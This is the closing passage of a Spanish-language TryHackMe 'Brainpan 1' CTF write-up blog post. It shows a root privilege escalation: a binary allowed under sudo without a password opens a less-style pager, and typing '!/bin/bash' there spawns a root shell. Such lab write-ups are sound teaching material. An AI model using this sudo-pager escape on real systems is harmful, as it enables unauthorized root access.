highlight highlighter-rouge"><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm</code></ul><p>Ya con esto tenemos una consola interactiva con la cual procedemos a seguir investigando en como ganar privilegios de <code class="language-plaintext highlighter-rouge">root</code>. En un principio entramos como el usuario <code class="language-plaintext highlighter-rouge">puck</code> pero al escribir <code class="language-plaintext highlighter-rouge">sudo -l</code> vemos que podemos ejecutar el paquete <code class="language-plaintext highlighter-rouge">/home/anansi/bin/anansi_util</code> como <code class="language-plaintext highlighter-rouge">root</code> sin proveer password: <img data-src="https://user-images.githubusercontent.com/85322110/149259975-82e6b7a6-0c99-46df-b6a8-56196afb9d7b.png" alt="image" data-proofer-ignore></p><p>Asi que ejecutamos el comando haciendo <code class="language-plaintext highlight highlighter-rouge"><span class="nb">sudo</span> /home/anansi/bin/anansi_util</code> vemos una serie de opciones, probamos con:</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="nb">sudo</span> /home/anansi/bin/anansi_util manual <span class="nb">cat</span></code></p></blockquote><p>Y vemos que nos abre un manual del tipo <code class="language-plaintext highlighter-rouge">man</code> o <code class="language-plaintext highlighter-rouge">less</code>, pero al estar ejecutando esto como <code class="language-plaintext highlighter-rouge">root</code> podemos facilmente escribir <code class="language-plaintext highlighter-rouge">!/bin/bash</code> para escapar del <code class="language-plaintext highlighter-rouge">less</code> y ejecutar comandos desde alli, y finalmente esto nos abrira una consola <code class="language-plaintext highlighter-rouge">bash</code> con permisos de <code class="language-plaintext highlighter-rouge">root</code>: <img data-src="https://user-images.githubusercontent.com/85322110/149260381-63acf414-9994-4a34-8a94-5fcc19f75c0e.png" alt="image" data-proofer-ignore></p><p>Con esto completamos el ultimo objetivo de nuestra maquina explotando exitosamente una vulnerabilidad de <code class="language-plaintext highlighter-rouge">buffer overflow</code> en ambos entornos Windows y Linux…</p><p>Saludos!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cajas/'>cajas</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >bof</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/escape/" class="post-tag no-text-decoration" >escape</a> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Este post esta bajo la licencia <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Brainpan 1 - THM Writeup - Rich J. Celedon&url=https://rjceledon.github.io/posts/brainpan-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Brainpan 1 - THM Writeup - Rich J. Celedon&u=https://rjceledon.github.io/posts/brainpan-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Brainpan 1 - THM Writeup - Rich J. Celedon&url=https://rjceledon.github.io/posts/brainpan-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar link" title-succeed="Link copiado satisfactoriamente!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado Recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/the-marketplace-thm-writeup/">The Marketplace - THM Writeup</a><li><a href="/posts/brainpan-thm-writeup/">Brainpan 1 - THM Writeup</a><li><a href="/posts/blog-thm-writeup/">Blog - THM Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Tags Populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/escape/">escape</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenidos</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Seguir Leyendo</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/blog-thm-writeup/"><div class="card-body"> <em class="timeago small" date="2022-01-14 22:34:00 +0000" >14 Jan, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blog - THM Writeup</h3><div class="text-muted small"><p> Hoy traemos la maquina Blog de TryHackMe en donde segun su misma descripcion indica que esta usando el Sistema de Gestion de Contenido (CMS) muy conocido WordPress el cual tambien tiene una lista...</p></div></div></a></div><div class="card"> <a href="/posts/the-marketplace-thm-writeup/"><div class="card-body"> <em class="timeago small" date="2022-01-07 22:55:30 +0000" > 7 Jan, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The Marketplace - THM Writeup</h3><div class="text-muted small"><p> En el campo de la ciberseguridad, el realizar las pruebas en competencias del tipo Captura la bandera o CTF nos ayuda a comprender los conceptos claves sobre aquellas vulnerabilidades que pudiese...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/the-marketplace-thm-writeup/" class="btn btn-outline-primary" prompt="Mas viejo"><p>The Marketplace - THM Writeup</p></a> <a href="/posts/blog-thm-writeup/" class="btn btn-outline-primary" prompt="Mas nuevo"><p>Blog - THM Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/">Rich J. Celedon</a>. <span data-toggle="tooltip" data-placement="top" title="Excepto cuando se señale lo contrario, los posts del blog de este sitio estan licenciados bajo Creative Commons Attribution 4.0 International (CC BY 4.0) Licenciado por el autor.">Ciertos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Tags Populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/escape/">escape</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se hallaron resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
